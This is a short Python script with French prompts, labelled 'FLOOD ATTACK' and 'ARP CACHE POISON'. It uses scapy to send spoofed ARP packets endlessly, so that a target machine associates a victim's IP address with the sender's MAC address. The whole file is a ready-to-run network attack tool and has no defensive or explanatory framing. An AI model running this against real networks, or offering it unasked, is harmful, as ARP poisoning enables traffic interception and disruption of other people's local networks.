#! /usr/bin/env python
# -*-coding:Utf-8 -*
# ------- FLOOD ATTACK -------
import sys

print("-------------------------Bienvenue----------------------")
print("ARP CACHE POISON")
print("pour arreter le programme, faites controle + c")


from scapy.all import *

def arpcachepoison(cible, victime):
        cible_mac = getmacbyip(cible)
        p = Ether(dst=cible_mac) /ARP(op="who-has", psrc=victime, pdst=cible)
        sendp(p)

cible = input("ip cible : ")
victime = input("ip victime : ")
while 1:
        arpcachepoison(cible, victime)
